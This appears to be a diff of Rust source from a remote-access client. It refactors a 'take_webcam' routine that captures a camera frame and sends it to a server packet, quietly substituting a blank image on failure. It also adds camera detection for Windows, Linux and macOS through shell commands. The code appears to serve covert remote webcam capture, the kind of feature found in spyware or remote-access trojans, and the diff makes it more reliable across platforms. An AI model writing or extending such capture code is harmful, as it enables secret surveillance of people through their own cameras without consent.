@@ -16,7 +16,6 @@ pub async fn take_webcam() {
                 });
             }
             _ => {
-                // On failure, send a blank white image
                 let white_image = create_blank_image(640, 480);
                 tokio::spawn(async move {
                     if let Err(_) = send_packet(ServerboundPacket::WebcamResult(white_image)).await {}
@@ -27,36 +26,15 @@ pub async fn take_webcam() {
 }
 
 fn safe_webcam_capture() -> Option<Vec<u8>> {
-    match panic::catch_unwind(AssertUnwindSafe(|| {
-        attempt_nokhwa_capture()
-    })) {
-        Ok(Some(data)) => Some(data),
-        _ => None
-    }
+    attempt_nokhwa_capture()
 }
 
 fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
     use nokhwa::{Camera, utils::{CameraIndex, RequestedFormat, RequestedFormatType}};
     use nokhwa::pixel_format::RgbFormat;
 
-    #[cfg(target_os = "windows")]
-    {
-        let devices_output = Command::new("powershell")
-            .args(&["-Command", "Get-PnpDevice -Class Camera -Status OK | Measure-Object | Select-Object -ExpandProperty Count"])
-            .output();
-            
-        match devices_output {
-            Ok(output) => {
-                if let Ok(count_str) = String::from_utf8(output.stdout) {
-                    if let Ok(count) = count_str.trim().parse::<i32>() {
-                        if count == 0 {
-                            return None;
-                        }
-                    }
-                }
-            }
-            Err(_) => {}
-        }
+    if !has_webcam() {
+        return None;
     }
     
     let camera_index = CameraIndex::Index(0);
@@ -75,34 +53,81 @@ fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
         return None;
     }
     
-    let frame_result = panic::catch_unwind(AssertUnwindSafe(|| {
-        camera.frame()
-    }));
-    
-    let _ = panic::catch_unwind(AssertUnwindSafe(|| {
-        camera.stop_stream()
-    }));
-    
-    let frame = match frame_result {
-        Ok(Ok(f)) => f,
-        _ => return None
-    };
-    
-    let data_result = panic::catch_unwind(AssertUnwindSafe(|| {
-        let buffer = frame.buffer();
-        
-        if buffer.len() > 100_000_000 {
+    let frame = match camera.frame() {
+        Ok(f) => f,
+        Err(_) => {
+            let _ = camera.stop_stream();
             return None;
         }
-        
-        let data: Vec<u8> = buffer.iter().cloned().collect();
-        Some(data)
-    }));
+    };
     
-    match data_result {
-        Ok(Some(data)) => Some(data),
-        _ => None
+    let _ = camera.stop_stream();
+    
+    let buffer = frame.buffer();
+    if buffer.len() > 100_000_000 {
+        return None;
     }
+    
+    let data: Vec<u8> = buffer.iter().cloned().collect();
+    Some(data)
+}
+
+fn has_webcam() -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        let devices_output = Command::new("powershell")
+            .args(&["-Command", "Get-PnpDevice -Class Camera -Status OK | Measure-Object | Select-Object -ExpandProperty Count"])
+            .output();
+            
+        match devices_output {
+            Ok(output) => {
+                if let Ok(count_str) = String::from_utf8(output.stdout) {
+                    if let Ok(count) = count_str.trim().parse::<i32>() {
+                        return count > 0;
+                    }
+                }
+            }
+            Err(_) => {}
+        }
+    }
+    
+    #[cfg(target_os = "linux")]
+    {
+        let devices_output = Command::new("sh")
+            .args(&["-c", "ls /dev/video* 2>/dev/null | wc -l"])
+            .output();
+            
+        match devices_output {
+            Ok(output) => {
+                if let Ok(count_str) = String::from_utf8(output.stdout) {
+                    if let Ok(count) = count_str.trim().parse::<i32>() {
+                        return count > 0;
+                    }
+                }
+            }
+            Err(_) => {}
+        }
+    }
+    
+    #[cfg(target_os = "macos")]
+    {
+        let devices_output = Command::new("sh")
+            .args(&["-c", "system_profiler SPCameraDataType 2>/dev/null | grep -c 'Camera'"])
+            .output();
+            
+        match devices_output {
+            Ok(output) => {
+                if let Ok(count_str) = String::from_utf8(output.stdout) {
+                    if let Ok(count) = count_str.trim().parse::<i32>() {
+                        return count > 0;
+                    }
+                }
+            }
+            Err(_) => {}
+        }
+    }
+    
+    false
 }
 
 fn create_blank_image(width: u32, height: u32) -> Vec<u8> {
